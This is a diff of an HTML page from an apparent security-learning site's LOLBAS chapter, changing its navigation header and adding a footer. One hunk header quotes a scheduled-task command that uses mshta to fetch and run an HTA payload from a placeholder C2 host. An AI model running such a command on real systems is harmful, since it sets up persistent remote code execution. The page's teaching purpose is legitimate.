@@ -49,33 +49,31 @@
 </head>
 <body>
   <div class="reading-progress" id="readingProgress"></div>
-  <header class="site-header">
-    <div class="header-inner">
-      <div class="header-left">
-        <a href="../index.html" class="logo-link">
-          <img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32">
-        </a>
-        <div class="nav-pill">
-          <span class="nav-pill-name">H3AD-LEARN</span>
-          <span class="nav-pill-sep">·</span>
-          <span class="nav-pill-tagline">ATTACKER TRADECRAFT</span>
-        </div>
-      </div>
-      <nav class="header-nav">
-        <a href="../index.html" class="nav-link">Hub</a>
-        <a href="index.html" class="nav-link">LOLBAS</a>
-        <a href="../threat-hunting/index.html" class="nav-link">Threat Hunting</a>
-        <a href="../threat-intel/index.html" class="nav-link">Threat Intel</a>
-        <a href="../cloud-security/index.html" class="nav-link">Cloud Security</a>
-      </nav>
-      <div class="header-actions">
-        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
-          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
-          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
-        </button>
+    <div id="scroll-sentinel" aria-hidden="true"></div>
+  <nav class="nav">
+    <div class="hamburger" id="hamburger" role="button" tabindex="0" aria-label="Open navigation menu" aria-expanded="false" aria-controls="navDrawer" onclick="toggleDrawer()" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();toggleDrawer();}"><span></span><span></span><span></span></div>
+    <a class="nav-brand" href="https://h3ad-sec.github.io/">
+      <img id="site-logo" src="https://h3ad-sec.github.io/logo-dark.png" alt="H3AD-SEC">
+    </a>
+    <a class="xv-nav-pill" id="xv-nav-pill" href="../index.html" style="text-decoration:none">
+      <span class="xv-pill-name"><span class="xv-pill-accent">H3AD</span><span class="xv-pill-text">-LEARN</span></span>
+      <span class="xv-pill-tagline">ATTACKER TRADECRAFT</span>
+    </a>
+    <div class="nav-right">
+      <div class="theme-toggle" id="themeToggle" role="button" tabindex="0" aria-label="Toggle light/dark theme" title="Toggle theme">
+        <div class="toggle-track"><div class="toggle-thumb"></div></div>
       </div>
     </div>
-  </header>
+  </nav>
+  <div class="nav-drawer" id="navDrawer">
+    <a href="https://h3ad-sec.github.io/">HOME &nbsp;&#8599;</a>
+    <a href="../index.html">H3AD-LEARN</a>
+    <a href="../threat-hunting/index.html" class="drawer-sub">&#8623; THREAT HUNTING</a>
+    <a href="../lolbas/index.html" class="drawer-sub nav-current">&#8623; LOLBAS</a>
+    <a href="../threat-intel/index.html" class="drawer-sub">&#8623; THREAT INTELLIGENCE</a>
+    <a href="../cloud-security/index.html" class="drawer-sub">&#8623; CLOUD SECURITY</a>
+    <a href="../interview-prep/index.html" class="drawer-sub">&#8623; INTERVIEW PREP</a>
+  </div>
   <div class="chapter-layout">
     <aside class="toc-sidebar" id="tocSidebar">
       <a href="index.html" class="toc-back-link">← LOLBAS</a>
@@ -481,6 +479,25 @@ schtasks /cr /tn "x" /tr "mshta http://C2/p.hta" /sc daily</code></pre>
       </article>
     </main>
   </div>
+    <footer class="site-footer">
+    <div class="container">
+      <div class="footer-inner">
+        <a href="https://h3ad-sec.github.io" class="footer-brand">H3AD-SEC</a>
+        <span class="footer-sep">/</span>
+        <span class="footer-project">H3AD-LEARN</span>
+        <span class="footer-sep">&#47;&#47;</span>
+        <span class="footer-muted">LOLBAS</span>
+      </div>
+    </div>
+    <div class="footer-credit-row">
+      <a class="footer-credit-pill" href="https://www.linkedin.com/in/hrushikesh-badgujar/" target="_blank" rel="noopener" title="Connect on LinkedIn">
+        <span class="credit-tool"><span class="xv-pill-accent">H3AD</span><span class="xv-pill-text">-LEARN</span></span>
+        <span class="credit-by">created by</span>
+        <span class="credit-name">H3AD</span>
+      </a>
+      <span class="footer-copyright">&copy; 2026 H3AD-SEC</span>
+    </div>
+  </footer>
   <script src="../js/learn.js"></script>
   <script>document.addEventListener('DOMContentLoaded', () => initChapter('04', 6));</script>
 </body>
